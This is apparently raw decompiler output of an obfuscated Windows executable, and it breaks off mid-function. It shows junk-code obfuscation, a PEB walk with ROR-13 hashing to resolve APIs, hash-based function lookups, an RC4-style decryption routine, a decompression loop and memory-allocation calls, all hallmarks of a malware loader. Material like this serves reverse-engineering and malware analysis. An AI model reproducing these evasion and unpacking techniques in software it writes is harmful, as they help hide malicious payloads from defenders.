      LODWORD(v145) = v145 - (_DWORD)&v147;
      v122 |= 0xB8u;
    }
    v81 |= 0x78u;
    v36 = (unsigned int)v26 + v142;
  }
  v32 = v85 & v36;
LABEL_18:
  v24 = (unsigned int)&savedregs | 0x219A;
  LOWORD(v144) = v144 + 188;
  LOWORD(v134) = v134 ^ 0xD0;
  v62 = v32 ^ 0x23D0;
  v142 ^= 0x7Au;
  if ( v24 == v62 )
    goto LABEL_48;
  v33 = v62 - 14;
  v84 -= 92;
  v178 &= 0xE6u;
  v34 = v24 - v33;
  if ( v33 )
  {
LABEL_71:
    v174 += 238;
    v136 += 238;
    goto LABEL_52;
  }
  v10 = *(_DWORD *)((_BYTE *)&a2 + 6) & *(_DWORD *)((_BYTE *)&a2 + 2) & v34;
  v161 &= v10;
  v11 = (*(int *)((char *)&savedregs + 1) ^ 0x31B)
      + (*(int *)((char *)&savedregs + 1) & (unsigned int)&savedregs)
      - *(_DWORD *)&v135[2];
  if ( v11 == 539 )
    goto LABEL_39;
  v12 = v10 - a2;
  v13 = (*(unsigned int *)((char *)&retaddr + 3) | v11) - a2;
  v20 = v13 - (_DWORD)&savedregs;
  LOWORD(v87) = (unsigned __int8)v87 & 0x76;
  LOBYTE(v131) = v131 & 0xD6;
  v151 &= 0xBu;
  if ( v20 != v126 )
    goto LABEL_39;
  v21 = v20 | (unsigned int)&savedregs;
  v133 &= 0xECu;
  v22 = v20 - v12;
  v141 -= v12;
  LOBYTE(v131) = v131 - 31;
  if ( v22 == v12 )
  {
    v57 = v22 + 2852;
    v58 = v12 & 0xB24;
    LOWORD(v162[0]) -= 161;
    if ( v57 != 694 )
      goto LABEL_48;
    LOWORD(v127) = v127 - 45;
    HIWORD(v118) ^= 0xCCu;
    v151 += v58;
    if ( v58 != v21 )
      PerformanceCount.LowPart -= v21;
LABEL_39:
    v139 -= 24;
LABEL_48:
    v111 &= 0xE6u;
    HIDWORD(v78) = BYTE4(v78) & 0x80;
    LOWORD(v150) = v150 + 252;
    goto LABEL_71;
  }
LABEL_52:
  v170 |= 0x42u;
  v80 &= 0x96u;
  v49 = QueryPerformanceCounter(&v152);
  v3 = v50 ^ 0x2814;
  v51 = v49 - 1489;
  if ( *(_DWORD *)&v90[2] != v3 )
  {
    v160 ^= 0xACu;
    v51 ^= v113;
    v158 -= 34;
  }
  v64 = v51 - 12407;
  v119[0] ^= v64;
  if ( v64 != v127 )
  {
    v120[8] -= 10;
    *(_DWORD *)&v120[8] |= v64;
    v7 = (unsigned int)&savedregs;
    v66 = DWORD2(a2) + *(int *)((char *)&savedregs + 3) + v2;
    v67 = v122 | (savedregs + v64);
    if ( (int *)PerformanceCount.HighPart != &savedregs )
    {
      v56 = (char *)&savedregs;
      v55 = DWORD1(a2) & (unsigned int)&savedregs;
      v54 = *(_DWORD *)((char *)&a2 + 5) | v66;
      v177 &= 0x99u;
      v109 &= v54;
      v152.HighPart ^= DWORD1(a2) & (unsigned int)&savedregs;
      v116 += 144;
      if ( &savedregs == (int *)(DWORD1(a2) & (unsigned int)&savedregs) )
      {
        v59 = *(_DWORD *)&v157[2] ^ v55;
        if ( v54 )
          goto LABEL_11;
        v6 = &v97;
        v7 = LODWORD(v99) ^ (v59 - *(_DWORD *)((char *)&a2 + 1));
        v8 = (int)&savedregs + *(_DWORD *)((char *)&v99 + 2) - v98;
        if ( v7 )
        {
LABEL_25:
          v28 = (unsigned int)&v6[v7];
          v29 = v8 ^ 0x3C78;
          v30 = (unsigned int)&v6[v29];
          v25 = v30 | v28;
          LOBYTE(v109) = v109 & 0x13;
          v129 |= v25;
          v54 = (v30 + 6381) | (v30 + v29);
          v59 = v144 & v25;
          v170 |= 0x93u;
LABEL_11:
          v14 = v153 | v59;
          v82 += 254;
          v124 &= v14;
          v2 = *(_DWORD *)&v92[2] + (*(int *)((char *)&savedregs + 3) | (v54 - *(int *)((char *)&savedregs + 3)));
          v3 = *(_DWORD *)v92 + v14;
          goto LABEL_19;
        }
        v54 = (int)&savedregs;
        v55 = (unsigned int)&savedregs;
        v95 &= (unsigned int)&v104 + 1;
        v56 = (char *)&v104 - 5453;
      }
      v175 += v54;
      v7 = (unsigned int)&v88 & *(_DWORD *)&v90[2] & (*(_DWORD *)v90 | v55);
      v66 = (int)&v89[-v95 - 4];
      v67 = (__int16)&v89[(int)v56 - 4 - v78];
    }
    v6 = (char *)(v67 & 0x2DEA);
    v8 = (v7 & v66) - 10271;
    goto LABEL_25;
  }
LABEL_19:
  WORD2(v78) ^= 7u;
  v143 &= 0xA8u;
  v77 = v2 - v122;
  v72 = (int)&savedregs;
  v27 = (a2 & v3) - v77;
  LOWORD(v144) = v144 & 0x57;
  if ( v27 )
  {
    v72 = (int)&savedregs;
    v77 = (__PAIR64__(((unsigned int)&savedregs & v77) - DWORD1(a2), (unsigned int)&savedregs & v77)
         - __PAIR64__(&savedregs, DWORD1(a2))) >> 32;
  }
  if ( (char *)v77 == v173 )
  {
    LOBYTE(v131) = v131 - 58;
    v27 = (int)&savedregs;
    v77 = (unsigned int)v93 + *(unsigned int *)((char *)&retaddr + 3);
    v72 = v140 & *(_DWORD *)((_BYTE *)&a2 + 6) & DWORD2(a2) & (unsigned int)&savedregs;
  }
  if ( v178 == v27 )
    goto LABEL_85;
  v48 = v72 + v77 + __CFADD__(v72, v77) + v72 + v77;
  v93[0] -= 141;
  if ( !v72 )
    goto LABEL_47;
  v132 += v48;
  v60 = *(int *)((char *)v114 + 2) & v48;
  v72 = v60 + 2 * (_DWORD)&v113;
  v61 = v27 | v60;
  if ( v72 )
  {
    v148 += 232;
    v73 = v61 | (v61 + (v136 ^ v27));
    v96 ^= 0x48u;
    if ( v72 == 371 )
      goto LABEL_33;
    if ( (char *)v72 != v138 )
      goto LABEL_26;
    ++v176;
    v88 += 207;
    v52 = &v138[-((__PAIR64__(v72, v123) + 138) >> 32)];
    v173 = (char *)((unsigned __int8)v173 & 0xD2);
    if ( (char *)HIDWORD(v145) != v52 )
      goto LABEL_46;
    BYTE4(PerformanceCount.QuadPart) &= 0xC0u;
  }
  v72 = ((unsigned int)&savedregs - (*(int *)((char *)&savedregs + 3) ^ a2 ^ (unsigned int)&v81) - savedregs) ^ 0x2D2;
  v73 = v72 & (unsigned int)&savedregs;
LABEL_33:
  v27 = HIDWORD(v94) & (v165 + v73);
LABEL_85:
  v73 = *(_DWORD *)&v120[1] ^ (*(_DWORD *)&v120[6] | *(_DWORD *)&v120[4] & v27);
  v151 ^= v73;
  v167 |= 0x5Bu;
  v52 = (char *)v119 + v72;
LABEL_46:
  v48 = (v73 | (unsigned int)v52) - v169;
LABEL_47:
  v72 = *(_DWORD *)((_BYTE *)&a2 + 7) & ((unsigned int)&savedregs + v48);
LABEL_26:
  result = *(_DWORD *)((char *)&v94 + 2) ^ (*(_DWORD *)v135 | v72);
  LOWORD(v148) = v148 + 183;
  return result;
}
// 402DFC: variables would overlap: ^334.4 and ^335.4,^337.4
// 402DFC: variables would overlap: ^338.4(retaddr) and ^33A.4,^33B.4
// 402DFC: using guessed type _DWORD var_224[2];
// 402DFC: using guessed type _DWORD var_1C4[2];

//----- (0040313E) --------------------------------------------------------
int __usercall sub_40313E@<eax>(int a1@<eax>)
{
  if ( a1 % 46 >= 0 )
    return 174;
  sub_40313E(169);
  return 476;
}
// 4028E4: conditional instruction was optimized away because %var_18.4==4B

//----- (00403544) --------------------------------------------------------
int __usercall sub_403544@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 238;
  v1 = a1 / 238;
  if ( v2 >= 13 )
    return 111;
  sub_403D89(v1);
  return 321;
}
// 402637: conditional instruction was optimized away because %var_14.4==AE
// 402648: conditional instruction was optimized away because edi.4==EE
// 40264F: conditional instruction was optimized away because edi.4==EE
// 404A07: conditional instruction was optimized away because %var_10.4==13
// 4052A7: conditional instruction was optimized away because %var_C.4==CE

//----- (00403909) --------------------------------------------------------
int sub_403909()
{
  int v0; // ecx
  int result; // eax

  dword_43FC27 = sub_406118() + 17247;
  if ( (unsigned int)dword_43FC27 < 0xB6D7174E )
    return sub_401814();
  dword_43E030 += v0;
  result = sub_405BF5();
  LOBYTE(dword_43E030) = 109;
  return result;
}
// 403944: variable 'v0' is possibly undefined
// 43E030: using guessed type int dword_43E030;
// 43FC27: using guessed type int dword_43FC27;

//----- (00403D06) --------------------------------------------------------
#error "40548D: call analysis failed (funcsize=182)"

//----- (00403D89) --------------------------------------------------------
int __usercall sub_403D89@<eax>(int a1@<eax>)
{
  if ( a1 % 66 < 17 )
    return 148;
  else
    return 132;
}

//----- (00403DC3) --------------------------------------------------------
int __usercall sub_403DC3@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v3; // eax
  int v4; // eax
  int v5; // edx
  int v6; // et2

  *(_DWORD *)(a2 - 4) = 210;
  *(_DWORD *)(a2 - 20) = 39;
  *(_DWORD *)(a2 - 16) = 58;
  *(_DWORD *)(a2 - 12) = 198;
  *(_DWORD *)(a2 - 8) = 137;
  v6 = a1 % 87;
  v4 = a1 / 87;
  v5 = v6;
  if ( v5 >= 28 )
    return 184;
  *(_DWORD *)(a2 - 24) = *(_DWORD *)(a2 - 20) + 2897;
  v3 = sub_40313E(v4);
  sub_4043F4(v3);
  return 260;
}

//----- (004043F4) --------------------------------------------------------
int __usercall sub_4043F4@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 193;
  v1 = a1 / 193;
  if ( v2 >= 33 )
    return 138;
  sub_40313E(v1);
  return 570;
}
// 402A9E: conditional instruction was optimized away because %var_C.4==FE

//----- (0040469F) --------------------------------------------------------
int __usercall sub_40469F@<eax>(int a1@<eax>)
{
  if ( a1 % 113 < 24 )
    return 347;
  else
    return 28;
}
// 402A7A: conditional instruction was optimized away because %var_20.4==7B
// 402A86: conditional instruction was optimized away because %var_18.4==A1

//----- (004048CC) --------------------------------------------------------
unsigned int __usercall sub_4048CC@<eax>(int a1@<edx>, int a2@<ebx>)
{
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  dword_43FBEB ^= a1 + 1560;
  dword_43E04C -= a1 + 26986;
  dword_43E004 = 21944;
  result = retaddr & 0xFFFF0000;
  dword_43E030 = a2 + 8913;
  dword_43E034 = (int)&ReadProcessMemory;
  dword_43FBD3 = retaddr & 0xFFFF0000;
  LOBYTE(dword_43E040) = dword_43E040 + 112;
  dword_43E014 = retaddr & 0xFFFF0000;
  return result;
}
// 43E004: using guessed type int dword_43E004;
// 43E014: using guessed type int dword_43E014;
// 43E030: using guessed type int dword_43E030;
// 43E034: using guessed type int dword_43E034;
// 43E040: using guessed type int dword_43E040;
// 43E04C: using guessed type int dword_43E04C;
// 43FBD3: using guessed type int dword_43FBD3;
// 43FBEB: using guessed type int dword_43FBEB;

//----- (004048E5) --------------------------------------------------------
int __usercall sub_4048E5@<eax>(int a1@<eax>, int a2@<ebp>)
{
  *(_DWORD *)(a2 - 64) = 182;
  *(_DWORD *)(a2 - 96) = 154;
  *(_DWORD *)(a2 - 76) = 108;
  *(_DWORD *)(a2 - 20) = 241;
  *(_DWORD *)(a2 - 12) = 182;
  *(_DWORD *)(a2 - 36) = 222;
  *(_DWORD *)(a2 - 88) = 239;
  *(_DWORD *)(a2 - 68) = 213;
  *(_DWORD *)(a2 - 24) = 108;
  *(_DWORD *)(a2 - 60) = 117;
  *(_DWORD *)(a2 - 72) = 241;
  *(_DWORD *)(a2 - 84) = 222;
  *(_DWORD *)(a2 - 80) = 104;
  *(_DWORD *)(a2 - 40) = 239;
  *(_DWORD *)(a2 - 4) = 24;
  *(_DWORD *)(a2 - 48) = 154;
  *(_DWORD *)(a2 - 16) = 213;
  *(_DWORD *)(a2 - 8) = a1 % 24;
  if ( a1 % 24 >= 0 )
    return 69;
  *(_DWORD *)(a2 - 64) = 104;
  *(_DWORD *)(a2 - 100) = *(_DWORD *)(a2 - 12);
  *(_DWORD *)(a2 - 56) = *(_DWORD *)(a2 - 20);
  return 336;
}

//----- (004049F9) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_4049F9@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v3; // eax

  *(_DWORD *)(a2 - 44) = 75;
  *(_DWORD *)(a2 - 28) = 115;
  *(_DWORD *)(a2 - 8) = 75;
  *(_DWORD *)(a2 - 40) = 82;
  *(_DWORD *)(a2 - 12) = 175;
  *(_DWORD *)(a2 - 32) = 49;
  *(_DWORD *)(a2 - 36) = 162;
  *(_DWORD *)(a2 - 4) = 82;
  *(_DWORD *)(a2 - 24) = 66;
  *(_DWORD *)(a2 - 16) = 91;
  *(_DWORD *)(a2 - 52) = 175;
  *(_DWORD *)(a2 - 20) = 86;
  *(_DWORD *)(a2 - 48) = a1 % 82;
  if ( a1 % 82 >= 37 )
    return 22;
  if ( *(int *)(a2 - 12) <= 25 )
    *(_DWORD *)(a2 - 4) = *(_DWORD *)(a2 - 20);
  v3 = sub_402288(*(_DWORD *)(a2 - 40) == *(_DWORD *)(a2 - 28));
  sub_405BAA(v3);
  return 246;
}
// 402612: positive sp value 4 has been found

//----- (00404BE6) --------------------------------------------------------
int __usercall sub_404BE6@<eax>(int a1@<eax>)
{
  if ( a1 % 102 < 37 )
    return 184;
  else
    return 14;
}
// 401272: conditional instruction was optimized away because %var_10.4==2
// 405C13: conditional instruction was optimized away because %var_C.4==A4

//----- (00404F27) --------------------------------------------------------
int __usercall sub_404F27@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  return sub_403DC3(a1, (int)&savedregs);
}

//----- (00404FF1) --------------------------------------------------------
int __usercall sub_404FF1@<eax>(int a1@<eax>)
{
  if ( a1 % 164 < 3 )
    return 221;
  else
    return 153;
}
// 402297: conditional instruction was optimized away because %var_4.4==F0
// 4047A1: conditional instruction was optimized away because %var_10.4==F0
// 406F06: conditional instruction was optimized away because %var_4.4==F0
// 406F0C: conditional instruction was optimized away because %var_4.4==F0

//----- (00405230) --------------------------------------------------------
int __usercall sub_405230@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // et2

  v3 = a1 % 141;
  v2 = a1 / 141;
  if ( v3 >= 22 )
    return 159;
  sub_401F0C(v2);
  return 790;
}
// 402930: conditional instruction was optimized away because %var_10.4==6F
// 40450B: conditional instruction was optimized away because %var_10.4==6F
// 404512: conditional instruction was optimized away because %var_10.4==6F

//----- (00405BAA) --------------------------------------------------------
int __usercall sub_405BAA@<eax>(int a1@<eax>)
{
  if ( a1 % 62 < 7 )
    return 684;
  else
    return 17;
}
// 404DCA: conditional instruction was optimized away because %var_1C.4==3E
// 404DD0: conditional instruction was optimized away because %var_1C.4==3E

//----- (00405BF5) --------------------------------------------------------
int sub_405BF5()
{
  int result; // eax
  unsigned int v1; // eax

  LOBYTE(dword_43E040) = dword_43E040 + 7;
  LOBYTE(dword_43E024) = -98;
  dword_43E030 = 24813;
  v1 = dword_43FBD7 ^ (dword_43FBD7 << 11);
  dword_43E01C -= 8818;
  dword_43FBD7 = dword_43FBE3;
  dword_43FBE3 = dword_43FC23;
  dword_43FC23 = unk_43FB5A;
  dword_43E020 -= (int)&GetCPInfo;
  dword_43E040 += 29181;
  unk_43FB5A ^= (v1 >> 8) ^ v1 ^ (unk_43FB5A >> 19);
  result = unk_43FB5A;
  dword_43E044 -= 16459 - dword_43EA28;
  dword_43E004 = dword_43EBBC;
  return result;
}
// 43E004: using guessed type int dword_43E004;
// 43E01C: using guessed type int dword_43E01C;
// 43E020: using guessed type int dword_43E020;
// 43E024: using guessed type int dword_43E024;
// 43E030: using guessed type int dword_43E030;
// 43E040: using guessed type int dword_43E040;
// 43E044: using guessed type int dword_43E044;
// 43EA28: using guessed type int dword_43EA28;
// 43EBBC: using guessed type int dword_43EBBC;
// 43FBD7: using guessed type int dword_43FBD7;
// 43FBE3: using guessed type int dword_43FBE3;
// 43FC23: using guessed type int dword_43FC23;

//----- (00406118) --------------------------------------------------------
int sub_406118()
{
  int v1; // eax
  DWORD v2; // [esp+1Ch] [ebp-2C8h]
  int v3; // [esp+30h] [ebp-2B4h]
  DWORD v4; // [esp+ACh] [ebp-238h]
  int v5; // [esp+C4h] [ebp-220h]
  int v6; // [esp+E4h] [ebp-200h]
  DWORD flProtect; // [esp+100h] [ebp-1E4h]
  DWORD v8; // [esp+104h] [ebp-1E0h]
  int v9; // [esp+114h] [ebp-1D0h]
  DWORD v10; // [esp+11Ch] [ebp-1C8h]
  DWORD v11; // [esp+1B0h] [ebp-134h]
  DWORD v12; // [esp+1C0h] [ebp-124h]
  DWORD flAllocationType; // [esp+1C8h] [ebp-11Ch]
  DWORD v14; // [esp+1E4h] [ebp-100h]
  DWORD v15; // [esp+228h] [ebp-BCh]
  int v16; // [esp+26Ch] [ebp-78h]
  DWORD v17; // [esp+2A4h] [ebp-40h]
  DWORD v18; // [esp+2B4h] [ebp-30h]

  GetOEMCP();
  VirtualAlloc(0, 0xE00u, flAllocationType, flProtect);
  GetOEMCP();
  VirtualAlloc(0, 0x600u, v17, v18);
  GetOEMCP();
  GetACP();
  VirtualAlloc(0, 0x600u, v15, v14);
  GetACP();
  VirtualAlloc(0, 0x400u, v12, v11);
  VirtualAlloc(0, 0x500u, v8, v4);
  GetOEMCP();
  GetCurrentThreadId();
  VirtualAlloc(0, 0x1000u, v2, v10);
  GetCurrentThreadId();
  v1 = v3 + ((unsigned int)(v9 + v16 + 1) < 0xE6C) + GetOEMCP();
  if ( v9 + v16 == 3691 )
    v1 = v6 + 988;
  return v1 - v5;
}
// 402AE3: variable 'flAllocationType' is possibly undefined
// 402AE3: variable 'flProtect' is possibly undefined
// 40534A: variable 'v17' is possibly undefined
// 40534A: variable 'v18' is possibly undefined
// 404DA3: variable 'v15' is possibly undefined
// 404DA3: variable 'v14' is possibly undefined
// 406EAB: variable 'v12' is possibly undefined
// 406EAB: variable 'v11' is possibly undefined
// 40399F: variable 'v8' is possibly undefined
// 40399F: variable 'v4' is possibly undefined
// 4012AF: variable 'v5' is possibly undefined
// 4035BD: variable 'v2' is possibly undefined
// 4035BD: variable 'v10' is possibly undefined
// 4035EB: variable 'v3' is possibly undefined
// 4035DE: variable 'v9' is possibly undefined
// 4035DE: variable 'v16' is possibly undefined
// 40361A: variable 'v6' is possibly undefined

//----- (004061F1) --------------------------------------------------------
int __usercall sub_4061F1@<eax>(int a1@<eax>)
{
  if ( a1 % 21 < 17 )
    return 980;
  else
    return 61;
}

//----- (004062A9) --------------------------------------------------------
int __usercall sub_4062A9@<eax>(int a1@<eax>)
{
  if ( a1 % 25 < 17 )
    return 959;
  else
    return 72;
}
// 40224A: conditional instruction was optimized away because %var_50.4==EB
// 403A6E: conditional instruction was optimized away because %var_54.4==19

//----- (00406329) --------------------------------------------------------
int __usercall sub_406329@<eax>(int a1@<eax>)
{
  if ( a1 % 60 < 0 )
    return 403;
  else
    return 110;
}
// 40305E: conditional instruction was optimized away because ebx.4==14
// 403065: conditional instruction was optimized away because ebx.4==14
// 40490F: conditional instruction was optimized away because %var_14.4==B7
// 404915: conditional instruction was optimized away because %var_14.4==B7
// 40491C: conditional instruction was optimized away because %var_14.4==B7

//----- (004064CF) --------------------------------------------------------
int __usercall sub_4064CF@<eax>(int a1@<eax>)
{
  if ( a1 % 49 < 7 )
    return 182;
  else
    return 37;
}
// 403B45: conditional instruction was optimized away because %var_20.4==EC
// 403B4B: conditional instruction was optimized away because %var_20.4==EC

//----- (00407259) --------------------------------------------------------
char *__usercall sub_407259@<eax>(int a1@<esi>)
{
  char *result; // eax
  int v2; // edx
  char *v3; // esi
  int v4; // ebx
  int v5; // esi
  int v6; // edx
  int v7; // ecx
  int v8; // edx
  int v9; // [esp-4h] [ebp-4h]

  result = sub_40962D(262468866);
  dword_43E014 -= dword_43E83C + a1;
  if ( result )
  {
    dword_43FBA1 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
    dword_43E048 += (int)&GetSystemTime;
    result = sub_40962D(1493072574);
    if ( result )
    {
      dword_43FD7E = (int (__thiscall *)(_DWORD, _DWORD, _DWORD))result;
      LOBYTE(dword_43E048) = dword_43E048 + 78;
      result = sub_40962D(150532372);
      LOBYTE(dword_43E040) = -109;
      LOBYTE(dword_43E01C) = 42;
      if ( result )
      {
        dword_43E02C = v9;
        dword_43E01C = 3366;
        dword_43FB8E = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
        LOBYTE(dword_43E00C) = dword_43E00C + 97;
        result = sub_40962D(1916711125);
        LOBYTE(v8) = byte_43E390;
        if ( result )
        {
          dword_43E014 = (int)(&GetSystemTime + 5251);
          dword_43FC03 = (int (__thiscall *)(_DWORD))result;
          dword_43E024 += 30673;
          dword_43E020 -= v8;
          result = sub_40962D(-2114916129);
          dword_43E008 = v7;
          v3 = result + 30673;
          v4 = dword_43F7C4;
          if ( result )
          {
            dword_43FC43 = (int (__stdcall *)(_DWORD))result;
            result = sub_40962D(1216340331);
            v5 = (unsigned int)(v3 - 17879) ^ 0x769;
            LOBYTE(dword_43E018) = dword_43E018 + 88;
            dword_43E02C = v6;
            if ( result )
            {
              dword_43FBEF = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
              dword_43E010 = v4;
              dword_43E018 = 7559;
              result = sub_40962D(255840707);
              dword_43E014 += v5;
              dword_43E020 = 8270;
              dword_43E014 -= 5397;
              if ( result )
              {
                dword_43FD72 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
                LOBYTE(dword_43E03C) = dword_43E03C - 90;
                sub_408A45(2 * ((unsigned int)&SearchPathA | 0x4155), v4);
                LOBYTE(dword_43E010) = dword_43E010 - 36;
                BYTE1(v2) = byte_43ED68;
                dword_43E014 -= v2;
                dword_43E004 -= 16185;
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 407A68: variable 'v6' is possibly undefined
// 408634: variable 'v9' is possibly undefined
// 4096AE: variable 'v8' is possibly undefined
// 4083FF: variable 'v7' is possibly undefined
// 407668: variable 'v2' is possibly undefined
// 43E004: using guessed type int dword_43E004;
// 43E008: using guessed type int dword_43E008;
// 43E00C: using guessed type int dword_43E00C;
// 43E010: using guessed type int dword_43E010;
// 43E014: using guessed type int dword_43E014;
// 43E018: using guessed type int dword_43E018;
// 43E01C: using guessed type int dword_43E01C;
// 43E020: using guessed type int dword_43E020;
// 43E024: using guessed type int dword_43E024;
// 43E02C: using guessed type int dword_43E02C;
// 43E03C: using guessed type int dword_43E03C;
// 43E040: using guessed type int dword_43E040;
// 43E048: using guessed type int dword_43E048;
// 43E390: using guessed type char byte_43E390;
// 43E83C: using guessed type int dword_43E83C;
// 43ED5C: using guessed type int dword_43ED5C;
// 43ED68: using guessed type char byte_43ED68;
// 43F068: using guessed type int dword_43F068;
// 43F7C4: using guessed type int dword_43F7C4;
// 43FB8E: using guessed type int (__stdcall *dword_43FB8E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FBA1: using guessed type int (__fastcall *dword_43FBA1)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FBD3: using guessed type int dword_43FBD3;
// 43FBEF: using guessed type int (__fastcall *dword_43FBEF)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FC03: using guessed type int (__thiscall *dword_43FC03)(_DWORD);
// 43FC0B: using guessed type int dword_43FC0B;
// 43FC43: using guessed type int (__stdcall *dword_43FC43)(_DWORD);
// 43FD72: using guessed type int (__fastcall *dword_43FD72)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FD7E: using guessed type int (__thiscall *dword_43FD7E)(_DWORD, _DWORD, _DWORD);

//----- (00407280) --------------------------------------------------------
unsigned __int8 __cdecl sub_407280(_BYTE *a1, unsigned int a2, int a3)
{
  unsigned __int8 v3; // bl
  unsigned __int8 result; // al
  unsigned int i; // [esp+Ch] [ebp-8h]
  unsigned __int8 v7; // [esp+13h] [ebp-1h]

  v3 = *(_BYTE *)(a3 + 256);
  v7 = *(_BYTE *)(a3 + 257);
  for ( i = 0; i < a2; ++a1 )
  {
    v3 = (v3 + 1) % 256;
    v7 += *(_BYTE *)(a3 + v3);
    sub_408882((_BYTE *)(a3 + v3), (_BYTE *)(a3 + v7));
    *a1 ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v7) + *(_BYTE *)(a3 + v3)));
    ++i;
  }
  *(_BYTE *)(a3 + 256) = v3;
  result = v7;
  *(_BYTE *)(a3 + 257) = v7;
  return result;
}

//----- (004076FF) --------------------------------------------------------
struct _LIST_ENTRY *sub_4076FF()
{
  int v0; // ecx
  int v1; // edi
  struct _LIST_ENTRY *v2; // esi
  int Flink_low; // eax
  struct _LIST_ENTRY *v5; // ebx
  struct _LIST_ENTRY *Flink; // edx

  Flink = NtCurrentPeb()->Ldr->InMemoryOrderModuleList.Flink;
  do
  {
    v2 = Flink[5].Flink;
    v0 = 24;
    v1 = 0;
    dword_43E010 = 3683;
    do
    {
      Flink_low = LOBYTE(v2->Flink);
      v2 = (struct _LIST_ENTRY *)((char *)v2 + 1);
      dword_43E01C -= (int)&GetSystemTime;
      if ( (char)Flink_low >= 97 )
        LOBYTE(Flink_low) = Flink_low - 32;
      v1 = Flink_low + __ROR4__(v1, 13);
      LOBYTE(dword_43E044) = 96;
      --v0;
    }
    while ( v0 );
    v5 = Flink[2].Flink;
    Flink = Flink->Flink;
  }
  while ( v1 != 1783282779 );
  dword_43E028 = 2077;
  return v5;
}
// 43E010: using guessed type int dword_43E010;
// 43E01C: using guessed type int dword_43E01C;
// 43E028: using guessed type int dword_43E028;
// 43E044: using guessed type int dword_43E044;

//----- (0040777B) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_40777B@<eax>(
        int a1@<eax>,
        unsigned __int8 *a2@<edx>,
        _DWORD *a3@<ebp>,
        unsigned int *a4@<edi>,
        int a5@<esi>,
        int a6,
        int a7,
        int a8)
{
  int v8; // edx
  unsigned int v9; // ecx
  unsigned int v10; // esi
  unsigned int *v11; // ecx
  int v12; // ecx
  int v13; // edx
  unsigned int v14; // ecx
  unsigned int v15; // edx
  unsigned int v16; // ebx
  int v17; // ecx
  int v18; // ebx
  unsigned int *v19; // edi
  int v20; // ecx
  int v21; // ebx
  char *v22; // ecx
  int v23; // ecx
  unsigned int v24; // eax
  int v25; // ecx
  unsigned int v26; // ecx
  int v27; // ebx
  bool v28; // sf
  bool v29; // of
  int v30; // edx
  unsigned int *v31; // edx
  int v32; // ecx
  unsigned int v33; // eax
  unsigned int *v34; // edx
  int v35; // ecx
  unsigned int v36; // eax
  unsigned int v37; // edi
  unsigned int v38; // eax
  unsigned int v39; // edi
  unsigned int v40; // edi
  int v41; // ecx
  int v42; // edx
  int v43; // edi
  unsigned int *v44; // edi
  int v45; // ecx
  int v46; // ecx
  unsigned int v47; // edx
  unsigned int v48; // esi
  unsigned int v49; // edx
  unsigned int v50; // esi
  unsigned int v51; // edx
  int v52; // esi
  unsigned int v53; // eax
  int v54; // ecx
  int v55; // edx
  unsigned int v56; // ecx
  unsigned int v57; // ebx
  bool v58; // cc
  int v59; // ecx
  int v60; // esi
  unsigned int *v61; // ecx
  int v62; // edi
  int v63; // ecx
  unsigned int v64; // ecx
  int v65; // edi
  unsigned int v66; // ecx
  int v67; // edx
  unsigned int v68; // edi
  int v69; // edi
  int v70; // ecx
  int v71; // edx
  unsigned int v72; // ecx
  unsigned int v73; // edi
  unsigned int v74; // eax
  unsigned int v75; // ecx
  int v76; // edx
  int v77; // ecx
  bool v78; // zf
  unsigned int v80; // edx
  int v81; // ecx
  unsigned int v82; // edi
  int v83; // edi
  int v84; // ecx
  unsigned int v85; // eax
  unsigned int v86; // ecx
  unsigned int v87; // ecx
  unsigned int v88; // esi
  unsigned int v89; // edx
  int v90; // edx
  unsigned int v91; // ecx
  unsigned int v92; // edi
  char v93; // dl
  int v94; // esi
  int v95; // edi
  unsigned int v96; // esi
  int v97; // esi
  int v98; // ecx
  int v99; // edx
  unsigned int v100; // edi
  unsigned int v101; // eax
  unsigned int *v102; // edi
  bool v103; // cc
  int v104; // ecx
  int v105; // ebx
  unsigned int v106; // edi
  unsigned int *v107; // edx
  int v108; // ecx
  int v109; // edx
  unsigned int v110; // ecx

  v23 = *a2 | (a3[3] << 8);
  v24 = a1 << 8;
  ++*(a3 - 2);
  a3[3] = v23;
  while ( 1 )
  {
    v56 = *a4;
    v57 = *a4 * (v24 >> 11);
    if ( a3[3] >= v57 )
      break;
    v96 = v56 + ((2048 - v56) >> 5);
    v46 = 3072 * *((unsigned __int8 *)a3 - 1);
    *a4 = v96;
    v13 = 1;
    v103 = *(a3 - 3) < 7;
    v104 = v46 + a3[4] + 7384;
    v24 = v57;
    *(a3 - 8) = v104;
    if ( !v103 )
    {
      *(a3 - 9) = *(unsigned __int8 *)(*(a3 - 4) - *(a3 - 5) + a3[2]);
      while ( 1 )
      {
        *(a3 - 9) *= 2;
        v60 = *(a3 - 9) & 0x100;
        v61 = (unsigned int *)(*(a3 - 8) + 4 * (v60 + v13) + 1024);
        *(a3 - 11) = v61;
        if ( v24 < 0x1000000 )
        {
          v62 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
          v24 <<= 8;
          ++*(a3 - 2);
          a3[3] = v62;
        }
        v91 = *v61;
        v92 = v91 * (v24 >> 11);
        if ( a3[3] >= v92 )
